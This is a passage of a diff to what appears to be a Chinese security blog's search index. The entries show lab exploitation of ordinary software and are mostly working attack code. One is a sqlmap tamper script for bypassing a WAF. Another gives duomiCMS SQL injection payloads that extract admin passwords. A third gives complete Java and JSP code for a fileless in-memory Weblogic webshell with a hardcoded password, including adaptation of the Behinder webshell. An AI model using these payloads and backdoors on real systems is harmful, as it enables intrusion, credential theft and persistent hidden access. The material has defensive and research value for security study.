class="line"><span class="string">        * Oracle 10g</span></span><br><span class="line"><span class="string">        * PostgreSQL 8.3, 8.4, 9.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Notes:</span></span><br><span class="line"><span class="string">        * Useful to bypass weak and bespoke web application firewalls</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tamper(&#x27;SELECT id FROM users&#x27;)</span></span><br><span class="line"><span class="string">    &#x27;SELECT/**/id/**/FROM/**/users&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = <span class="string">&quot;&quot;</span></span><br><span class="line">        quote, doublequote, firstspace = <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        retVal = payload.replace(<span class="string">&#x27;SCHEMA.&#x27;</span>, <span class="string">&#x27;SCHEMA/**/.&#x27;</span>)</span><br><span class="line">        retVal = retVal.replace(<span class="string">&#x27;UNION &#x27;</span>, <span class="string">&#x27;UNION%0A&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+]]></content>
+      <tags>
+        <tag>注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Phpstudy - RCE 复现</title>
     <url>/2019/10/12/Phpstudy-RCE-%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<h2 id="check"><a href="#check" class="headerlink" title="check"></a>check</h2><p>9月26号就写好了，一下子就到这个时候了，严重拖延症</p>
@@ -396,27 +417,6 @@
       <tags>
         <tag>复现</tag>
         <tag>RCE</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Mysql注入 - Sqlmap之tamper编写</title>
-    <url>/2018/03/28/Mysql%E6%B3%A8%E5%85%A5-Sqlmap%E4%B9%8Btamper%E7%BC%96%E5%86%99/</url>
-    <content><![CDATA[<h1 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass @"></a>Bypass <code>@</code></h1><img src="/2018/03/28/Mysql%E6%B3%A8%E5%85%A5-Sqlmap%E4%B9%8Btamper%E7%BC%96%E5%86%99/bypass@error.png" class="">
-<p>如图，遇到<code>@</code>，导致注入失败，使用mysql表名即可绕过</p>
-<img src="/2018/03/28/Mysql%E6%B3%A8%E5%85%A5-Sqlmap%E4%B9%8Btamper%E7%BC%96%E5%86%99/bypass@.png" class="">
-
-<h1 id="Bypass-WAF"><a href="#Bypass-WAF" class="headerlink" title="Bypass WAF"></a>Bypass WAF</h1><a id="more"></a>
-<p>该站存在WAF，<code>union</code>不可与<code>select</code>同时出现，简单使用<code>%0A</code>即可绕过，即<code>union%0Aselect</code>；<br>另外<code>information_schema.tables</code>也被拉黑，fuzz后发现也不难绕，改为<code>information_schema/**/.tables</code>即可绕过。</p>
-<h1 id="Tamper编写"><a href="#Tamper编写" class="headerlink" title="Tamper编写"></a>Tamper编写</h1><p>这下绕过是没问题了，可惜sqlmap跑不了，遂想编写一针对此站的tamper，供sqlmap调用，但因未实现过此方式，翻看sqlmap中<em>tamper</em>，发现很简单，接口已经准备好，只需要对payload进行处理就能让sqlmap调用。</p>
-<p>编写<code>own.py</code>放入<em>tamper</em>目录下即可</p>
-<p><font color=red>注意：sqlmap中的payload均是大写</font></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2016 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;doc/COPYING&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Replaces space character (&#x27; &#x27;) with comments &#x27;/**/&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Tested against:</span></span><br><span class="line"><span class="string">        * Microsoft SQL Server 2005</span></span><br><span class="line"><span class="string">        * MySQL 4, 5.0 and 5.5</span></span><br><span class="line"><span class="string">        * Oracle 10g</span></span><br><span class="line"><span class="string">        * PostgreSQL 8.3, 8.4, 9.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Notes:</span></span><br><span class="line"><span class="string">        * Useful to bypass weak and bespoke web application firewalls</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tamper(&#x27;SELECT id FROM users&#x27;)</span></span><br><span class="line"><span class="string">    &#x27;SELECT/**/id/**/FROM/**/users&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = <span class="string">&quot;&quot;</span></span><br><span class="line">        quote, doublequote, firstspace = <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        retVal = payload.replace(<span class="string">&#x27;SCHEMA.&#x27;</span>, <span class="string">&#x27;SCHEMA/**/.&#x27;</span>)</span><br><span class="line">        retVal = retVal.replace(<span class="string">&#x27;UNION &#x27;</span>, <span class="string">&#x27;UNION%0A&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-]]></content>
-      <tags>
-        <tag>注入</tag>
       </tags>
   </entry>
   <entry>
@@ -517,46 +517,61 @@
       </tags>
   </entry>
   <entry>
-    <title>duomiCMS</title>
-    <url>/2016/11/01/duomiCMS/</url>
-    <content><![CDATA[<h2 id="变量覆盖导致注入"><a href="#变量覆盖导致注入" class="headerlink" title="变量覆盖导致注入"></a>变量覆盖导致注入</h2><ol>
-<li><p>漏洞页面：<code>\member\invitation.php</code></p>
- <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($dm==<span class="string">&#x27;yq&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">	$ccgid=$_SESSION[<span class="string">&#x27;duomi_user_group&#x27;</span>];</span><br><span class="line">	$ccuid=$_SESSION[<span class="string">&#x27;duomi_user_id&#x27;</span>];</span><br><span class="line">	$cc1=$dsql-&gt;GetOne(<span class="string">&quot;select * from duomi_member_group where gid=<span class="subst">$ccgid</span>&quot;</span>);</span><br><span class="line">	$ccgroup=$cc1[<span class="string">&#x27;gname&#x27;</span>];</span><br><span class="line">	$cc2=$dsql-&gt;GetOne(<span class="string">&quot;select * from duomi_member where id=<span class="subst">$ccuid</span>&quot;</span>);</span><br><span class="line">	$ccjifen=$cc2[<span class="string">&#x27;points&#x27;</span>];</span><br><span class="line">	$ccemail=$cc2[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">	$cclog=$cc2[<span class="string">&#x27;logincount&#x27;</span>];</span><br></pre></td></tr></table></figure>
-<p> $ccgid，$ccuid均无任何过滤直接带入查询，由于变量覆盖导致此处两个变量均可控制</p>
-<p> 该cms采用80sec通用防注入，网上公开方法即可绕过。</p>
-<p> 利用：来到member页面，随便注册一个用户,test,登入。</p>
- <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">http:<span class="comment">//127.0.0.1/duomicms_1.30/member/invitation.php</span></span><br><span class="line">_SESSION[duomi_user_id]=@`<span class="string">&#x27;` or updatexml(1, concat(0x7c, (select password from duomi_admin)), 3) and 1=@`&#x27;</span>`&amp;_SESSION[duomi_user_group]=<span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p> 注出管理员密码</p>
- <a id="more"></a>
- <img src="/2016/11/01/duomiCMS/duomiCMS_01.png" class="">
-</li>
-<li><p>漏洞页面：<code>\member\share.php</code></p>
- <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($dm==<span class="string">&#x27;index&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">$ccgid=$_SESSION[<span class="string">&#x27;duomi_user_group&#x27;</span>];</span><br><span class="line">$ccuid=$_SESSION[<span class="string">&#x27;duomi_user_id&#x27;</span>];</span><br><span class="line">$cc1=$dsql-&gt;GetOne(<span class="string">&quot;select * from duomi_member_group where gid=<span class="subst">$ccgid</span>&quot;</span>);</span><br><span class="line">$ccgroup=$cc1[<span class="string">&#x27;gname&#x27;</span>];</span><br><span class="line">$cc2=$dsql-&gt;GetOne(<span class="string">&quot;select * from duomi_member where id=<span class="subst">$ccuid</span>&quot;</span>);</span><br><span class="line">$ccjifen=$cc2[<span class="string">&#x27;points&#x27;</span>];</span><br><span class="line">$ccemail=$cc2[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">$cclog=$cc2[<span class="string">&#x27;logincount&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">开发中：</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p> $ccgid，$ccuid，同上</p>
- <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">http:<span class="comment">//127.0.0.1/duomicms_1.30/member/share.php</span></span><br><span class="line">dm=index&amp;_SESSION[duomi_user_id]=<span class="number">1</span>&amp;_SESSION[duomi_user_group]=@`<span class="string">&#x27;` or updatexml(1, concat(0x7c, (select password from duomi_admin)), 3) and 1=@`&#x27;</span>`</span><br></pre></td></tr></table></figure>
- <img src="/2016/11/01/duomiCMS/duomiCMS_02.png" class="">
+    <title>Weblogic - 无文件内存shell</title>
+    <url>/2021/09/27/Weblogic-%E6%97%A0%E6%96%87%E4%BB%B6%E5%86%85%E5%AD%98shell/</url>
+    <content><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>采用<code>vulhub</code>中<code>weblogic</code> <code>CVE-2020-14882</code>搭建，<code>vulhub</code>安装不赘述</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> vulhub/weblogic/CVE-<span class="number">2020</span>-<span class="number">14882</span>/</span><br><span class="line">sudo docker-compose up</span><br></pre></td></tr></table></figure>
 
 
-</li>
-</ol>
-<ol start="3">
-<li><p>漏洞页面：<code>\member\exchange.php</code></p>
- <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($dm==<span class="string">&#x27;mybuy&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">$page = $_GET[<span class="string">&quot;page&quot;</span>];</span><br><span class="line">$pcount = <span class="number">20</span>;</span><br><span class="line">$row=$dsql-&gt;getOne(<span class="string">&quot;select count(id) as dd from duomi_buy where uid=&quot;</span>.$uid);</span><br><span class="line">$rcount=$row[<span class="string">&#x27;dd&#x27;</span>];	</span><br><span class="line">$page_count = ceil($rcount/$pcount); </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_GET[<span class="string">&#x27;page&#x27;</span>])||$_GET[<span class="string">&#x27;page&#x27;</span>]&lt;<span class="number">0</span>)&#123; </span><br><span class="line">$page=<span class="number">1</span>; </span><br><span class="line">&#125;<span class="keyword">else</span> &#123; </span><br><span class="line">$page=$_GET[<span class="string">&#x27;page&#x27;</span>]; </span><br><span class="line">&#125;</span><br><span class="line">$select_limit = $pcount; </span><br><span class="line">$select_from = ($page - <span class="number">1</span>) * $pcount.<span class="string">&#x27;,&#x27;</span>; </span><br><span class="line">$pre_page = ($page == <span class="number">1</span>)? <span class="number">1</span> : $page - <span class="number">1</span>; </span><br><span class="line">$next_page= ($page == $page_count)? $page_count : $page + <span class="number">1</span> ; </span><br><span class="line">$dsql-&gt;setQuery(<span class="string">&quot;select * from duomi_buy where uid=&quot;</span>.$uid.<span class="string">&quot; limit &quot;</span>.($page<span class="number">-1</span>)*$pcount.<span class="string">&quot;,<span class="subst">$pcount</span>&quot;</span>);</span><br><span class="line">$dsql-&gt;Execute(<span class="string">&#x27;buylist&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<h2 id="内存cmd实现"><a href="#内存cmd实现" class="headerlink" title="内存cmd实现"></a>内存<code>cmd</code>实现</h2><p>原理和机制感兴趣的可以去看参考链接，比较详细，我跳过（太菜，看不懂）</p>
+<p>大致流程为：加载恶意类，动态注册<code>filter</code></p>
+<h3 id="1-编写恶意filter类"><a href="#1-编写恶意filter类" class="headerlink" title="1. 编写恶意filter类"></a>1. 编写恶意<code>filter</code>类</h3><a id="more"></a>
 
-<p> $uid，session取值，无过滤带入查询，post提交即可覆盖该变量</p>
- <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">http:<span class="comment">//127.0.0.1/duomicms_1.30/member/exchange.php</span></span><br><span class="line">_SESSION[duomi_user_id]=@`<span class="string">&#x27;` or updatexml(1, concat(0x7c, (select password from duomi_admin)), 3) and 1=@`&#x27;</span>`</span><br></pre></td></tr></table></figure>
- <img src="/2016/11/01/duomiCMS/duomiCMS_03.png" class="">
+<p>把<code>kuron3k0</code>的<code>cmd</code>代码拿去编译，使用<code>vscode</code>，修复一下问题，编译，对<code>java</code>不熟，也是通过这次学习了很多<code>java</code>相关知识</p>
+<p><code>vscode</code>中文件无红色报错，保存会自动编译到<code>output</code>，查看<code>Configure Classpath</code>即可找到路径，无需再手动<code>F5</code>编译，否则会提示找不到主类</p>
+<p>源代码中会使网站所有访问被过滤，导致执行后网站会500，稍作修改</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line">   </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cmdFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span></span>&#123;</span><br><span class="line">   </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;&#125;;</span><br><span class="line">   </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">   </span><br><span class="line">        System.out.println(<span class="string">&quot;============== in evilfilter ==============&quot;</span>);</span><br><span class="line">        String pwd = request.getParameter(<span class="string">&quot;pwd&quot;</span>);</span><br><span class="line">        String cmd = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(pwd!=<span class="keyword">null</span> &amp;&amp; cmd!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(pwd.equals(<span class="string">&quot;redn3ck&quot;</span>)) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;============== running cmd ==============&quot;</span>);</span><br><span class="line">                String result = <span class="keyword">new</span> java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(<span class="string">&quot;\\A&quot;</span>).next();</span><br><span class="line">                response.getOutputStream().println(result);</span><br><span class="line">                response.getOutputStream().flush();</span><br><span class="line">       </span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;chain.doFilter(request, response);&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;chain.doFilter(request, response);&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译完成后，把<code>class</code>文件转为<code>base64</code>，用<code>py</code>完成</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">toBase64</span>(<span class="params">file, txt</span>):</span></span><br><span class="line">    <span class="keyword">with</span> open(file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> fileObj:</span><br><span class="line">        data = fileObj.read()</span><br><span class="line">        base64_data = base64.b64encode(data)</span><br><span class="line">        fout = open(txt, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">        fout.write(base64_data.decode())</span><br><span class="line">        fout.close()</span><br><span class="line"></span><br><span class="line">toBase64(<span class="string">r&#x27;C:\Users\Administrator\AppData\Roaming\Code\User\workspaceStorage\45d8f755763e840a79506c5be7b5e7b6\redhat.java\jdt_ws\cmd_7037b187\bin\cmdFilter.class&#x27;</span>, <span class="string">&#x27;out.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-加载恶意类-动态注册filter"><a href="#2-加载恶意类-动态注册filter" class="headerlink" title="2. 加载恶意类+动态注册filter"></a>2. 加载恶意类+动态注册<code>filter</code></h3><p>由于我们是<code>webshell</code>环境，肯定是执行<code>jsp</code>最为方便，所以使用<code>jsp</code>加载刚才生成的<code>base64</code>，并动态注册<code>filter</code></p>
+<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> <span class="keyword">import</span>=<span class="string">&quot;java.util.*&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Method&quot;</span> %&gt;</span><br><span class="line">&lt;%@ taglib prefix=<span class="string">&quot;c&quot;</span> uri=<span class="string">&quot;http://java.sun.com/jsp/jstl/core&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">	<span class="keyword">byte</span>[] codeClass = java.util.Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAfQcAAgEACWNtZEZpbHRlcg..&quot;</span>);</span><br><span class="line">	ClassLoader cl = (ClassLoader)Thread.currentThread().getContextClassLoader();</span><br><span class="line">	Method define = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="keyword">byte</span>[].class, <span class="keyword">int</span>.class, <span class="keyword">int</span>.class);</span><br><span class="line">	define.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">	Class evilFilterClass  = (Class)define.invoke(cl,codeClass,<span class="number">0</span>,codeClass.length);</span><br><span class="line"></span><br><span class="line"><span class="comment">//动态注册filter</span></span><br><span class="line"></span><br><span class="line">	String filterName = <span class="string">&quot;weblogic.work.SystemFilter.cmd&quot;</span>;</span><br><span class="line"></span><br><span class="line">	java.lang.reflect.Field cachedClassesF = cl.getClass().getDeclaredField(<span class="string">&quot;cachedClasses&quot;</span>);</span><br><span class="line">	cachedClassesF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">	Object cachedClass = cachedClassesF.get(cl);</span><br><span class="line">	java.lang.reflect.Method putM = cachedClass.getClass().getDeclaredMethod(<span class="string">&quot;put&quot;</span>, Object.class, Object.class);</span><br><span class="line">	putM.invoke(cachedClass, filterName, evilFilterClass);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取context</span></span><br><span class="line">	Class&lt;?&gt; executeThread = Class.forName(<span class="string">&quot;weblogic.work.ExecuteThread&quot;</span>);</span><br><span class="line">	java.lang.reflect.Method m = executeThread.getDeclaredMethod(<span class="string">&quot;getCurrentWork&quot;</span>);</span><br><span class="line">	Object currentWork = m.invoke(Thread.currentThread());</span><br><span class="line"></span><br><span class="line">	java.lang.reflect.Field connectionHandlerF = currentWork.getClass().getDeclaredField(<span class="string">&quot;connectionHandler&quot;</span>);</span><br><span class="line">	connectionHandlerF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">	Object obj = connectionHandlerF.get(currentWork);</span><br><span class="line"></span><br><span class="line">	java.lang.reflect.Field requestF = obj.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">	requestF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">	obj = requestF.get(obj);</span><br><span class="line"></span><br><span class="line">	java.lang.reflect.Field contextF = obj.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">	contextF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">	Object context = contextF.get(obj);</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用registerFilter注册</span></span><br><span class="line">	String evilName = <span class="string">&quot;weblogic.system.method.cmd&quot;</span>;</span><br><span class="line"></span><br><span class="line">	java.lang.reflect.Method getFilterManagerM = context.getClass().getDeclaredMethod(<span class="string">&quot;getFilterManager&quot;</span>);</span><br><span class="line">	Object filterManager = getFilterManagerM.invoke(context);</span><br><span class="line"></span><br><span class="line">	java.lang.reflect.Method registerFilterM = filterManager.getClass().getDeclaredMethod(<span class="string">&quot;registerFilter&quot;</span>, String.class, String.class, String[].class, String[].class, java.util.Map.class, String[].class);</span><br><span class="line">	registerFilterM.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">	registerFilterM.invoke(filterManager, evilName, filterName, <span class="keyword">new</span> String[]&#123;<span class="string">&quot;/*&quot;</span>&#125;, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>坑点：最后一行代码中<code>url</code>需要改为<code>new String[]&#123;&quot;/*&quot;&#125;</code>，意为对网站所有目录生效</p>
+<p>把该<code>jsp</code>拿去网站目录访问即可执行</p>
+<p>注意：<code>jsp</code>在哪个目录执行，最终利用就在该目录</p>
+<p>在其他目录利用会导致传参失败，该问题也是坑了很久</p>
+<p>我在<code>/console/css/cmd.jsp</code>目录下执行，所以<code>/console/css/?pwd=redn3ck&amp;cmd=id</code></p>
+<p><img src="cmd_ok.png" alt="cmd_ok"></p>
+<h2 id="内存webshell实现"><a href="#内存webshell实现" class="headerlink" title="内存webshell实现"></a>内存<code>webshell</code>实现</h2><p>原理一样，编译作者改好的冰蝎马，加载并注册即可编译</p>
+<p>编译时<code>weblogic.servlet.internal.ServletRequestImpl</code>变红，没有这个库，去环境中把相关jar全部拿回</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">find</span> / -name weblogic.jar</span><br><span class="line">cp /var/lib/docker/overlay2/d13f05c242a61c2ec44aea486b84d94793ad7026d83a52be9d990378d22453ff/merged/u01/oracle/wlserver/server/lib/*.jar /tmp/jar/</span><br><span class="line">chmod <span class="number">777</span> /tmp/jar/</span><br></pre></td></tr></table></figure>
+
+<p><code>vscode</code>配置<code>Configure Classpath</code>，选中所有<code>jar</code>，即可编译成功</p>
+<p>执行<code>jsp</code>后使用冰蝎连接发现并不成功，查看终端<code>log</code></p>
+<p><img src="behinder_error.png" alt="behinder_error"></p>
+<p>提示第30行类型转换出错，遂将类型转换删除</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//map.put(&quot;response&quot;, ((weblogic.servlet.internal.ServletRequestImpl)request).getResponse());</span></span><br><span class="line">map.put(<span class="string">&quot;response&quot;</span>, response);</span><br></pre></td></tr></table></figure>
+
+<p>重新编译并执行，成功！</p>
+<p><img src="behinder_ok.png" alt="behinder_ok"></p>
+<p>需要注意的是，两次注册的名字需要更改，否则会把之前注册的覆盖掉或者导致网站500</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String filterName = <span class="string">&quot;weblogic.work.SystemFilter.behinder&quot;</span>;</span><br><span class="line">String evilName = <span class="string">&quot;weblogic.system.method.behinder&quot;</span>;</span><br></pre></td></tr></table></figure>
 
 
-
-
-
-</li>
-</ol>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>该方式可实现无文件<code>shell</code>，安全性大大提升，但由于是基于内存，重启服务器必然会消失</p>
+<p>另外，<code>java</code>这块很薄弱，感谢宝哥对我的大力帮助！瑞思拜，不肉！</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
+<p><a href="https://kuron3k0.github.io/2021/04/23/weblogic-memshell-1/">https://kuron3k0.github.io/2021/04/23/weblogic-memshell-1/</a><br><a href="https://paper.seebug.org/1249/">https://paper.seebug.org/1249/</a></p>
+</blockquote>
 ]]></content>
       <tags>
-        <tag>代码审计</tag>
+        <tag>vulhub</tag>
+        <tag>weblogic</tag>
+        <tag>java</tag>
+        <tag>shell</tag>
+        <tag>无文件</tag>
       </tags>
   </entry>
   <entry>
@@ -619,6 +634,49 @@
       <tags>
         <tag>Zimbra</tag>
         <tag>反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>duomiCMS</title>
+    <url>/2016/11/01/duomiCMS/</url>
+    <content><![CDATA[<h2 id="变量覆盖导致注入"><a href="#变量覆盖导致注入" class="headerlink" title="变量覆盖导致注入"></a>变量覆盖导致注入</h2><ol>
+<li><p>漏洞页面：<code>\member\invitation.php</code></p>
+ <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($dm==<span class="string">&#x27;yq&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">	$ccgid=$_SESSION[<span class="string">&#x27;duomi_user_group&#x27;</span>];</span><br><span class="line">	$ccuid=$_SESSION[<span class="string">&#x27;duomi_user_id&#x27;</span>];</span><br><span class="line">	$cc1=$dsql-&gt;GetOne(<span class="string">&quot;select * from duomi_member_group where gid=<span class="subst">$ccgid</span>&quot;</span>);</span><br><span class="line">	$ccgroup=$cc1[<span class="string">&#x27;gname&#x27;</span>];</span><br><span class="line">	$cc2=$dsql-&gt;GetOne(<span class="string">&quot;select * from duomi_member where id=<span class="subst">$ccuid</span>&quot;</span>);</span><br><span class="line">	$ccjifen=$cc2[<span class="string">&#x27;points&#x27;</span>];</span><br><span class="line">	$ccemail=$cc2[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">	$cclog=$cc2[<span class="string">&#x27;logincount&#x27;</span>];</span><br></pre></td></tr></table></figure>
+<p> $ccgid，$ccuid均无任何过滤直接带入查询，由于变量覆盖导致此处两个变量均可控制</p>
+<p> 该cms采用80sec通用防注入，网上公开方法即可绕过。</p>
+<p> 利用：来到member页面，随便注册一个用户,test,登入。</p>
+ <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">http:<span class="comment">//127.0.0.1/duomicms_1.30/member/invitation.php</span></span><br><span class="line">_SESSION[duomi_user_id]=@`<span class="string">&#x27;` or updatexml(1, concat(0x7c, (select password from duomi_admin)), 3) and 1=@`&#x27;</span>`&amp;_SESSION[duomi_user_group]=<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p> 注出管理员密码</p>
+ <a id="more"></a>
+ <img src="/2016/11/01/duomiCMS/duomiCMS_01.png" class="">
+</li>
+<li><p>漏洞页面：<code>\member\share.php</code></p>
+ <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($dm==<span class="string">&#x27;index&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">$ccgid=$_SESSION[<span class="string">&#x27;duomi_user_group&#x27;</span>];</span><br><span class="line">$ccuid=$_SESSION[<span class="string">&#x27;duomi_user_id&#x27;</span>];</span><br><span class="line">$cc1=$dsql-&gt;GetOne(<span class="string">&quot;select * from duomi_member_group where gid=<span class="subst">$ccgid</span>&quot;</span>);</span><br><span class="line">$ccgroup=$cc1[<span class="string">&#x27;gname&#x27;</span>];</span><br><span class="line">$cc2=$dsql-&gt;GetOne(<span class="string">&quot;select * from duomi_member where id=<span class="subst">$ccuid</span>&quot;</span>);</span><br><span class="line">$ccjifen=$cc2[<span class="string">&#x27;points&#x27;</span>];</span><br><span class="line">$ccemail=$cc2[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">$cclog=$cc2[<span class="string">&#x27;logincount&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">开发中：</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p> $ccgid，$ccuid，同上</p>
+ <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">http:<span class="comment">//127.0.0.1/duomicms_1.30/member/share.php</span></span><br><span class="line">dm=index&amp;_SESSION[duomi_user_id]=<span class="number">1</span>&amp;_SESSION[duomi_user_group]=@`<span class="string">&#x27;` or updatexml(1, concat(0x7c, (select password from duomi_admin)), 3) and 1=@`&#x27;</span>`</span><br></pre></td></tr></table></figure>
+ <img src="/2016/11/01/duomiCMS/duomiCMS_02.png" class="">
+
+
+</li>
+</ol>
+<ol start="3">
+<li><p>漏洞页面：<code>\member\exchange.php</code></p>
